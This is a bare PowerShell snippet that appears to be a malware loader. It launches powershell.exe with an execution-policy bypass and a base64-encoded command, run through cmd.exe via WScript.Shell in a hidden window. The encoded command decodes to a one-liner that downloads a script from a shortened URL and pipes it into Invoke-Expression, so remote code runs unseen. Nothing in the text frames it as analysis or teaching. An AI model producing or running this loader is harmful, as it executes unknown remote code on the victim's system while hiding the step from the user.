$pwCmd = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand aQByAG0AIABoAHQAdABwAHMAOgAvAC8AYgBpAHQALgBsAHkALwBJAG4AdgBlAG4AdABhAHIAaQBvAFMATwBMAEUAWAAgAHwAIABpAGUAeAA='
$arg = "/c `"$pwCmd`""

$wsh = New-Object -ComObject WScript.Shell

$wsh.Run("cmd.exe $arg", 0, $true)
